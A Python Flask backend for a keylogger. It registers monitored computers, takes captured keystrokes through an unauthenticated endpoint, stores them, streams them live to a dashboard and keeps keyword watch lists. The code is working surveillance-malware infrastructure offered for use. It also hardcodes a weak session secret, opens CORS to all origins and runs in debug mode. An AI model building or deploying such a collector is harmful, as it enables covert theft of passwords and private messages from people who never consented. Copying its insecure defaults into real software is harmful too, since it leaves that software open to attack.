import os
import re
from flask import Flask, render_template, request, jsonify, session
from keylogger.keylogger_service import KeyLoggerService
from flask_services import user_service, computers_service, keywords_service
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import time
from functools import wraps
from datetime import datetime

root_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))

app = Flask(
    __name__,
    template_folder=os.path.join(root_dir, 'templates'),
    static_folder=os.path.join(root_dir, 'static')
)

CORS(app)
app.secret_key = "supersecretkey"
socketio = SocketIO(app, cors_allowed_origins="*")

keylogger = KeyLoggerService()

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session:
            return jsonify({"success": False, "message": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated_function

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/login", methods=["POST"])
def login():
    data = request.json
    username = data.get("username")
    password = data.get("password")
    if user_service.validate_user(username, password):
        session["username"] = username
        return jsonify({"success": True, "message": "Login successful!"})
    return jsonify({"success": False, "message": "Invalid credentials."})

@app.route("/api/signup", methods=["POST"])
def signup():
    data = request.json
    username = data.get("username")
    password = data.get("password")

    if not re.match(r"^\d{9}$", username):
        return jsonify({"success": False, "message": "User ID must be exactly 9 digits."}), 400
    if len(password) < 8:
        return jsonify({"success": False, "message": "Password must be at least 8 characters long."}), 400
    if not re.search(r"[A-Z]", password):
        return jsonify({"success": False, "message": "Password must contain an uppercase letter."}), 400
    if not re.search(r"[!@#$%^&*(),.?\":{}|<>]", password):
        return jsonify({"success": False, "message": "Password must contain a special character."}), 400

    if not user_service.create_user(username, password):
        return jsonify({"success": False, "message": "User ID already exists."})
    return jsonify({"success": True, "message": "User created successfully!"})

@app.route("/api/logout", methods=["POST"])
def logout():
    session.pop('username', None)
    return jsonify({"success": True, "message": "Logged out successfully."})

@app.route("/api/computers/summary", methods=["GET"])
@login_required
def get_computers_summary():
    computers = computers_service.load_computers()
    summary_data = []
    for comp_id, comp_data in computers.items():
        key_count = keylogger.count_keys(comp_id)
        summary_data.append({
            "id": comp_id,
            "name": comp_data.get("name"),
            "last_seen": comp_data.get("last_seen"),
            "key_count": key_count
        })
    return jsonify(summary_data)

@app.route("/api/computers", methods=["POST"])
@login_required
def add_computer():
    data = request.json
    name = data.get("name")
    comp_id_from_request = data.get("comp_id")
    
    if not name or not comp_id_from_request:
        return jsonify({"success": False, "message": "Name and Computer ID are required."}), 400

    comp_id = computers_service.add_computer(name, comp_id=comp_id_from_request)

    if not comp_id:
        return jsonify({"success": False, "message": "A computer with this ID already exists."}), 409

    return jsonify({"success": True, "id": comp_id})

@app.route("/api/computers/<comp_id>", methods=["DELETE"])
@login_required
def delete_computer(comp_id):
    computers_service.delete_computer(comp_id)
    keylogger.delete_keys(comp_id)
    return jsonify({"success": True})

@app.route("/api/computers/rename/<comp_id>", methods=["PUT"])
@login_required
def rename_computer(comp_id):
    data = request.json
    new_name = data.get("new_name")
    if computers_service.rename_computer(comp_id, new_name):
        return jsonify({"success": True, "message": "Computer renamed successfully."})
    return jsonify({"success": False, "message": "Computer not found."})

@app.route("/api/keystrokes", methods=["POST"])
def log_keystroke():
    data = request.json
    comp_id = data.get("comp_id")
    key = data.get("key")
    timestamp = data.get("timestamp", time.time())

    if not comp_id or not key:
        return jsonify({"success": False, "message": "Missing required data"}), 400

    computers = computers_service.load_computers()
    if comp_id not in computers:
        return jsonify({"success": False, "message": "Computer ID not registered."}), 403

    now_iso = datetime.fromtimestamp(timestamp).isoformat()
    computers_service.update_last_seen(comp_id, now_iso)
    
    keylogger.log_key(comp_id, key, timestamp)
    
    socketio.emit('new_keystrokes', {
        'comp_id': comp_id,
        'words': [{'key': key, 'timestamp': now_iso}]
    })
    
    return jsonify({"success": True}), 200

@app.route("/api/keystrokes", methods=["DELETE"])
@login_required
def delete_keystroke():
    data = request.json
    comp_id = data.get("comp_id")
    timestamp = data.get("timestamp")
    key = data.get("key")

    if not all([comp_id, timestamp, key]):
        return jsonify({"success": False, "message": "Missing required data."}), 400
    
    was_deleted = keylogger.delete_key_entry(comp_id, timestamp, key)

    if was_deleted:
        return jsonify({"success": True, "message": "Entry deleted."})
    else:
        return jsonify({"success": False, "message": "Entry not found or error occurred."}), 404

@app.route("/api/keystrokes/<comp_id>", methods=["GET"])
@login_required
def get_keystrokes(comp_id):
    start_time_str = request.args.get('start')
    end_time_str = request.args.get('end')
    
    keystrokes = keylogger.get_keys(
        comp_id,
        limit=1000,
        start_time=start_time_str,
        end_time=end_time_str
    )
    return jsonify(keystrokes)

@app.route("/api/keywords", methods=["GET"])
@login_required
def get_keywords():
    keywords = keywords_service.load_keywords()
    return jsonify(keywords)

@app.route("/api/keywords", methods=["POST"])
@login_required
def add_keyword():
    data = request.json
    kw = data.get("keyword")
    keywords_service.add_keyword(kw)
    return jsonify({"success": True})

@app.route("/api/keywords/<kw>", methods=["DELETE"])
@login_required
def delete_keyword(kw):
    keywords_service.delete_keyword(kw)
    return jsonify({"success": True})

if __name__ == "__main__":
    socketio.run(app, host="127.0.0.1", port=8000, debug=True)